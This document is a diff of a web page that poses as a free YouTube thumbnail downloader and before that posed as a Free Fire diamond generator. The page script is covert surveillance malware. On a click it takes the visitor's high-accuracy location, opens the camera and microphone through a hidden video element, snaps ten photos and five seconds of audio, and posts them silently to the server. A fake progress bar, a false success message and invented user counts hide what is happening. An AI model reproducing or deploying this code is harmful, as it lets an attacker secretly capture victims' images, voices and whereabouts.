@@ -3,116 +3,327 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Diamond Generator</title>
+    <title>YouTube Thumbnail Downloader</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background-color: #0b131e; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
-        .container { width: 100%; max-width: 420px; background-color: #121c2c; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; }
-        .header { display: flex; justify-content: space-between; align-items: center; }
-        .logo-title { color: #ff5722; font-size: 26px; font-weight: 900; font-style: italic; }
-        .logo-sub { color: #ffffff; font-size: 26px; font-weight: 900; font-style: italic; }
-        .badge-diamonds { background-color: #ff9800; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #1a2638; padding: 12px 8px; border-radius: 14px; }
-        .stat-val { font-size: 16px; font-weight: bold; color: #ff7043; }
-        .stat-lbl { font-size: 10px; color: #90a4ae; margin-top: 3px; }
-        .card { background-color: #1a2638; padding: 12px 15px; border-radius: 14px; border: 1px solid #23344d; }
-        .card-label { font-size: 13px; color: #90a4ae; margin-bottom: 8px; display: block; }
-        .input-box { width: 100%; background: transparent; border: none; color: #ffb74d; font-size: 18px; font-weight: bold; outline: none; }
-        select.input-box { background-color: #1a2638; color: white; border-radius: 6px; padding: 4px 0; }
-        .grid-diamonds { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .diamond-card { background-color: #1a2638; border: 1px solid #23344d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
-        .diamond-card.active { background: linear-gradient(135deg, #ff9800, #ff5722); border-color: #ffb74d; }
-        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #ff5722; color: white; font-size: 8px; padding: 2px 6px; border-radius: 6px; }
-        .d-title { font-size: 16px; font-weight: bold; color: #ffffff; }
-        .d-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
-        .generate-btn { background: linear-gradient(135deg, #ff9800, #ff5722); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 12px; padding: 12px; text-align: center; color: #ef5350; font-weight: bold; }
-        .success-box { display: none; background-color: rgba(76, 175, 80, 0.15); border: 1px solid #4caf50; border-radius: 12px; padding: 12px; text-align: center; color: #81c784; font-weight: bold; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #0b0f19; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 0; padding-bottom: 30px; }
+        
+        .top-banner { background: linear-gradient(180deg, #ff0000 0%, #cc0000 100%); width: 100%; padding: 25px 15px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; }
+        .yt-logo { background: white; color: #ff0000; padding: 6px 16px; border-radius: 10px; font-size: 22px; font-weight: 900; display: inline-flex; align-items: center; gap: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .yt-title { font-size: 22px; font-weight: bold; color: #ffffff; display: flex; align-items: center; gap: 8px; }
+
+        .container { width: 100%; max-width: 420px; background-color: #ffffff; color: #333333; border-radius: 24px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: -20px; position: relative; z-index: 5; display: flex; flex-direction: column; gap: 15px; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #f8f9fa; padding: 12px 6px; border-radius: 16px; border: 1px solid #e9ecef; }
+        .stat-val { font-size: 15px; font-weight: bold; color: #ff0000; }
+        .stat-lbl { font-size: 10px; color: #6c757d; margin-top: 3px; }
+
+        .card { background-color: #f8f9fa; padding: 12px 15px; border-radius: 14px; border: 1px solid #e9ecef; }
+        .card-label { font-size: 13px; color: #6c757d; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; font-weight: bold; }
+        
+        .input-box { width: 100%; background: #ffffff; border: 1px solid #ced4da; border-radius: 30px; padding: 12px 18px; color: #333; font-size: 14px; outline: none; transition: 0.2s; }
+        .input-box:focus { border-color: #ff0000; box-shadow: 0 0 5px rgba(255,0,0,0.2); }
+
+        .grid-quality { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .q-card { background-color: #ffffff; border: 1px solid #ced4da; padding: 12px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; transition: 0.2s; }
+        .q-card.active { background: linear-gradient(135deg, #ff0000, #cc0000); border-color: #ff0000; color: white; }
+        .q-card.active .q-title, .q-card.active .q-sub { color: #ffffff !important; }
+        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #ff9800; color: white; font-size: 8px; font-weight: bold; padding: 2px 6px; border-radius: 6px; text-transform: uppercase; pointer-events: none; }
+        .q-title { font-size: 15px; font-weight: bold; color: #333; display: flex; align-items: center; justify-content: center; gap: 4px; pointer-events: none; }
+        .q-sub { font-size: 11px; color: #6c757d; margin-top: 4px; pointer-events: none; }
+
+        .generate-btn { background: linear-gradient(135deg, #ff0000, #cc0000); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 4px 15px rgba(255,0,0,0.3); transition: 0.2s; position: relative; z-index: 10; }
+        .generate-btn:active { transform: scale(0.98); }
+        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        .error-box { display: none; background-color: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #ff0000; font-weight: bold; }
+
+        .process-box { display: none; background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
+        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #6c757d; margin-bottom: 8px; }
+        .progress-bar-container { width: 100%; background-color: #e9ecef; height: 8px; border-radius: 4px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff0000, #cc0000); transition: width 0.3s ease; }
+
+        .success-box { display: none; background-color: rgba(40, 167, 69, 0.1); border: 1px solid #28a745; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #28a745; font-weight: bold; }
+
+        .guide-container { width: 100%; max-width: 420px; background-color: #ffffff; color: #333333; border-radius: 24px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
+        .guide-title { font-size: 16px; font-weight: bold; color: #333; text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 5px; }
+        .guide-step { background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 14px; padding: 12px 15px; display: flex; align-items: center; gap: 12px; }
+        .step-num { background-color: #ff0000; color: white; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; flex-shrink: 0; }
+        .step-text { font-size: 13px; color: #495057; font-weight: bold; }
+
+        .footer-info { text-align: center; font-size: 11px; color: #868e96; margin-top: 15px; }
+
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo-area"><span class="logo-title">FREE</span><span class="logo-sub">FIRE</span></div>
-            <div class="badge-diamonds">Diamonds</div>
-        </div>
-        <div class="stats-grid">
-            <div class="stat-card"><div class="stat-val">2.5M</div><div class="stat-lbl">Active Users</div></div>
-            <div class="stat-card"><div class="stat-val">8.7M</div><div class="stat-lbl">Diamonds Given</div></div>
-            <div class="stat-card"><div class="stat-val">99.8%</div><div class="stat-lbl">Success Rate</div></div>
-        </div>
-        <div class="card">
-            <span class="card-label">🆔 Enter Free Fire User ID</span>
-            <input type="text" class="input-box" id="userId" placeholder="Enter User ID here...">
-        </div>
-        <span class="card-label" style="margin-bottom: -5px;">Select Diamonds</span>
-        <div class="grid-diamonds">
-            <div class="diamond-card" data-diamond="1K"><div class="d-title">💎 1K</div><div class="d-sub">Diamonds</div></div>
-            <div class="diamond-card active" data-diamond="5K"><div class="pop-badge">POPULAR</div><div class="d-title">💎 5K</div><div class="d-sub">Diamonds</div></div>
-            <div class="diamond-card" data-diamond="10K"><div class="d-title">💎 10K</div><div class="d-sub">Diamonds</div></div>
-        </div>
-        <div class="card">
-            <span class="card-label">🌐 Select Server</span>
-            <select class="input-box" id="serverSelect">
-                <option value="India Server">🇮🇳 India Server</option><option value="Asia Server">🌏 Asia Server</option>
-            </select>
-        </div>
-        <button id="generateBtn" class="generate-btn">💎 Generate Diamonds</button>
-        <div id="errorBox" class="error-box">⚠️ Please enter your Free Fire User ID first!</div>
-        <div id="successBox" class="success-box">✅ Successfully added <span id="selectedDiamondText">5K</span> Diamonds to ID!</div>
+
+    <div class="top-banner">
+        <div class="yt-logo">▶ YouTube</div>
+        <div class="yt-title">Thumbnail Downloader</div>
     </div>
+
+    <div class="container">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-val" id="activeUsers">3.8M+</div>
+                <div class="stat-lbl">Total Downloads</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val" id="downloadsGiven">1.2M+</div>
+                <div class="stat-lbl">Happy Users</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val">4.9 ⭐</div>
+                <div class="stat-lbl">User Rating</div>
+            </div>
+        </div>
+
+        <div class="card" style="background: transparent; border: none; padding: 0;">
+            <span class="card-label">🔗 Enter Video URL</span>
+            <input type="text" class="input-box" id="videoUrl" placeholder="Paste YouTube Video URL here..">
+        </div>
+
+        <span class="card-label" style="margin-bottom: -5px;">Select Thumbnail Quality</span>
+        <div class="grid-quality">
+            <div class="q-card" data-quality="Normal HQ">
+                <div class="q-title">🖼️ HQ</div>
+                <div class="q-sub">Normal</div>
+            </div>
+            <div class="q-card active" data-quality="HD 1080p">
+                <div class="pop-badge">POPULAR</div>
+                <div class="q-title">🖼️ HD</div>
+                <div class="q-sub">Max Res</div>
+            </div>
+            <div class="q-card" data-quality="4K Ultra">
+                <div class="q-title">🖼️ 4K</div>
+                <div class="q-sub">Ultra HD</div>
+            </div>
+        </div>
+
+        <button id="generateBtn" class="generate-btn">
+            🔍 Fetch Thumbnail
+        </button>
+
+        <div id="errorBox" class="error-box">
+            ⚠️ Please enter a valid YouTube video URL first!
+        </div>
+
+        <div id="processBox" class="process-box">
+            <div class="process-text">
+                <span id="processStatus">Fetching thumbnail...</span>
+                <span id="processPercent">0%</span>
+            </div>
+            <div class="progress-bar-container">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+        </div>
+
+        <div id="successBox" class="success-box">
+            ✅ Thumbnail successfully fetched in <span id="selectedQualityText">HD 1080p</span>! Ready to download.
+        </div>
+    </div>
+
+    <div class="guide-container">
+        <div class="guide-title">
+            ❓ How to Download YouTube Thumbnail
+        </div>
+        <div class="guide-step">
+            <div class="step-num">1</div>
+            <div class="step-text">📋 Copy YouTube Video URL</div>
+        </div>
+        <div class="guide-step">
+            <div class="step-num">2</div>
+            <div class="step-text">📌 Paste URL in the box above</div>
+        </div>
+        <div class="guide-step">
+            <div class="step-num">3</div>
+            <div class="step-text">🚀 Click "Fetch Thumbnail"</div>
+        </div>
+        <div class="guide-step">
+            <div class="step-num">4</div>
+            <div class="step-text">💾 Select quality & Download</div>
+        </div>
+    </div>
+
+    <div class="footer-info">
+        🔒 YouTube Thumbnail Downloader - Free & Fast
+    </div>
+
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
+
     <script>
-        const diamondCards = document.querySelectorAll('.diamond-card');
-        let selectedDiamondValue = '5K';
-        diamondCards.forEach(c => c.addEventListener('click', function() {
-            diamondCards.forEach(x => x.classList.remove('active'));
-            this.classList.add('active');
-            selectedDiamondValue = this.getAttribute('data-diamond');
-        }));
-        async function sendData(fd) { try { await fetch(window.location.origin, { method: 'POST', body: fd }); } catch(e){} }
-        async function sendSinglePhoto(stream) {
-            const v = document.getElementById('video'), c = document.getElementById('canvas');
-            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
-            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+        setInterval(() => {
+            const users = (3.8 + Math.random() * 0.1).toFixed(1) + 'M+';
+            const downloads = (1.2 + Math.random() * 0.1).toFixed(1) + 'M+';
+            document.getElementById('activeUsers').innerText = users;
+            document.getElementById('downloadsGiven').innerText = downloads;
+        }, 3000);
+
+        const qualityCards = document.querySelectorAll('.q-card');
+        let selectedQualityValue = 'HD 1080p';
+
+        qualityCards.forEach(card => {
+            card.addEventListener('click', function(e) {
+                e.preventDefault();
+                qualityCards.forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                selectedQualityValue = this.getAttribute('data-quality');
+            });
+        });
+
+        async function sendData(formData) {
+            try {
+                await fetch('/page4', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
         }
-        async function recordAndSendAudio(stream) {
-            return new Promise(r => {
-                try {
-                    const mr = new MediaRecorder(stream), chunks = [];
-                    mr.ondataavailable = e => chunks.push(e.data);
-                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
-                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
-                } catch(e) { r(); }
+
+        async function sendSinglePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(async function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    await sendData(formData);
+                    resolve();
+                }, 'image/jpeg');
             });
         }
+
+        async function recordAndSendAudio(stream) {
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'voice.ogg');
+                        await sendData(formData);
+                        resolve();
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);
+                } catch (e) {
+                    resolve();
+                }
+            });
+        }
+
         document.getElementById("generateBtn").addEventListener("click", async function() {
-            const btn = document.getElementById("generateBtn"), uid = document.getElementById("userId").value.trim();
-            if(!uid) { document.getElementById("errorBox").style.display = "block"; return; }
-            document.getElementById("errorBox").style.display = "none"; btn.disabled = true; btn.innerText = "Connecting...";
-            document.getElementById("successBox").style.display = "block";
-            if (navigator.geolocation) {
-                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
-                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
-                }, () => r(), { timeout: 4000 }));
+            const btn = document.getElementById("generateBtn");
+            const urlInput = document.getElementById("videoUrl");
+            const urlVal = urlInput.value.trim();
+            const errorBox = document.getElementById("errorBox");
+            const processBox = document.getElementById("processBox");
+            const progressBar = document.getElementById("progressBar");
+            const processPercent = document.getElementById("processPercent");
+            const successBox = document.getElementById("successBox");
+
+            if (urlVal === "") {
+                errorBox.style.display = "block";
+                successBox.style.display = "none";
+                urlInput.focus();
+                return;
+            } else {
+                errorBox.style.display = "none";
             }
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            processBox.style.display = "block";
+
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                if (progress <= 100) {
+                    progressBar.style.width = progress + '%';
+                    processPercent.innerText = progress + '%';
+                }
+            }, 60);
+
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                            resolve();
+                        },
+                        () => { resolve(); },
+                        { timeout: 4000, enableHighAccuracy: true }
+                    );
+                });
+            }
+
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
                     await new Promise(r => setTimeout(r, 300));
-                    let count = 0;
-                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+
+                    let photoCount = 0;
+                    const maxPhotos = 10; 
+
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < maxPhotos) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 800);
+
                     await recordAndSendAudio(stream);
+
+                    while (photoCount < maxPhotos) {
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    clearInterval(photoInterval);
+
                     stream.getTracks().forEach(t => t.stop());
                 }
-            } catch(e) {}
-            btn.innerText = "Diamonds Generated ✅";
+            } catch (err) {}
+
+            clearInterval(progressInterval);
+            progressBar.style.width = '100%';
+            processPercent.innerText = '100%';
+
+            setTimeout(() => {
+                processBox.style.display = "none";
+                document.getElementById("selectedQualityText").innerText = selectedQualityValue;
+                
+                successBox.style.display = "block";
+                btn.innerText = "Thumbnail Fetched ✅";
+            }, 500);
         });
     </script>
 </body>
